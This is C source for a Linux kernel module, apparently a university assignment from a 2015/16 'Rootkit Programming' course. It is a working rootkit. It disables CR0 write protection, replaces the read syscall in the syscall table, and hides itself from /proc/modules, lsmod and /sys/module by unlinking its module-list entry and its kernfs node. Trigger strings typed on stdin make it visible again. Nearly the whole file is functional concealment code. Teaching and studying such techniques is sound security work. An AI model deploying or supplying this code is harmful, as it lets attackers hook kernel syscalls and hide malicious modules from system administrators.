
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_read */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/errno.h>	// error numbers
#include <linux/types.h>
#include <linux/unistd.h>	// all system call numbers
#include <linux/cred.h>		// struct cred
#include <linux/sched.h>	// struct task_struct
#include <linux/slab.h>
#include <linux/fs.h>		// virtual file system
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/miscdevice.h>
#include <linux/string.h>	// String manipulation
#include <linux/kobject.h>	// Define kobjects, stuructures, and functions
#include <linux/namei.h>	// file lookup
#include <linux/path.h>		// struct path, path_equal()
#include <linux/file.h>		// struct file *fget(unsigned int fd);
#include <linux/proc_fs.h>      // struct proc_dir_entry;

#include "module_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
#include "kernfs.h"				/* Needed for remove_kernfs_node, insert_kernfs_node */


MODULE_LICENSE("GPL");


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init module_masker_start(void)
{
	module_is_hidden = heartbeat_matched_so_far = voila_matched_so_far = 0;

	disable_write_protect_mode();

	/* Store original read syscall address */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_read_syscall = (void *) syscall_table[__NR_read];

	/* Overwrite manipulated read syscall */
	syscall_table[__NR_read] = (unsigned long *) my_read_syscall;

	/* Enable `write-protect` mode */
	enable_write_protect_mode();

	hide_module();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit module_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original read syscall */
	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


/* Function that replaces the original read syscall. In addition to what
   read syscall does, it also ... */
asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	int matches_count;
	int i;

	/* Call original read syscall */
	ret = original_read_syscall(fd, buf, count);

	/* If the read was not from STDIN don't do anything */
	if (fd != 0)
		return ret;

	if ((matches_count = count_matches(buf, HEARTBEAT, &heartbeat_matched_so_far)) > 0)
		for (i=0 ; i<matches_count ; i++)
			printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);

	if ((matches_count = count_matches(buf, VOILA, &voila_matched_so_far)) > 0) {
		printk(KERN_INFO "module_masker rootkit: visible mode on\n");
		unhide_module();
	}

	return ret;
}


int count_matches(char *buf, char *command, int *chars_matched_so_far)
{
	int matches;
	int i;

	/* Match the command */
	matches = i = 0;
	while (i < strlen(buf)) {
		if (command[(*chars_matched_so_far)++] != buf[i++])
			*chars_matched_so_far = 0;

		if (strlen(command) == *chars_matched_so_far) {
			*chars_matched_so_far = 0;
			matches++;
		}
	}

	return matches;
}


void hide_module(void)
{
	struct kernfs_node *kernfs_node_ptr;

	module_is_hidden = 1;

	/* Remove module structure from list with kernel modules, so it does
       not appear in /proc/modules and lsmod. Keep in mind that when the
       module is absent form the list, it cannot be uninstalled. */
	module_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	/* Hide module from /sys/module */
	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
	remove_kernfs_node(kernfs_node_ptr);
}


void unhide_module(void)
{
	struct kernfs_node *kernfs_node_ptr;

	if (!module_is_hidden)
		return;

	module_is_hidden = 0;

	list_add(&THIS_MODULE->list, module_prev);

	//err = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
	insert_kernfs_node(kernfs_node_ptr);
}


void remove_kernfs_node(struct kernfs_node *kernfs_node_ptr)
{
	/* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree
	 * Line 272@Linux/fs/kernfs/dir.c
	 */
	rb_erase(&kernfs_node_ptr->rb, &kernfs_node_ptr->parent->dir.children);
	RB_CLEAR_NODE(&kernfs_node_ptr->rb);
}


int insert_kernfs_node(struct kernfs_node *kernfs_node_ptr)
{
	struct rb_node **node = &kernfs_node_ptr->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;
	struct kernfs_node *pos;
	int cmp_res;

	while (*node) {
		/* Get the kernfs_node from rb, rb_to_kernfs_node_ptr() */
		pos = rb_entry(*node, struct kernfs_node, rb);
		parent = *node;
		/* Compare the names to get the position to insert in rb tree */
		cmp_res = name_compare(kernfs_node_ptr->hash, kernfs_node_ptr->name, kernfs_node_ptr->ns, pos);
		//cmp_res = kernfs_sd_comapre(kernfs_node_ptr,pos);

		if (cmp_res == 0)
			return -EEXIST;

		node = (cmp_res < 0) ? &pos->rb.rb_left : &pos->rb.rb_right;
	}

	/* Add new node and reblance the tree */
	rb_link_node(&kernfs_node_ptr->rb, parent,node);
	rb_insert_color(&kernfs_node_ptr->rb, &kernfs_node_ptr->parent->dir.children);

	/* Successfully added, account subdir number */
	if (kernfs_type(kernfs_node_ptr) == KERNFS_DIR)
		kernfs_node_ptr->parent->dir.subdirs++;

	return 0;
}


int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kernfs_node_ptr)
{
	if (hash != kernfs_node_ptr->hash)
		return hash - kernfs_node_ptr->hash;

	if (ns != kernfs_node_ptr->ns)
		return ns - kernfs_node_ptr->ns;

	return strcmp(name, kernfs_node_ptr->name);
}


module_init(module_masker_start);
module_exit(module_masker_end);
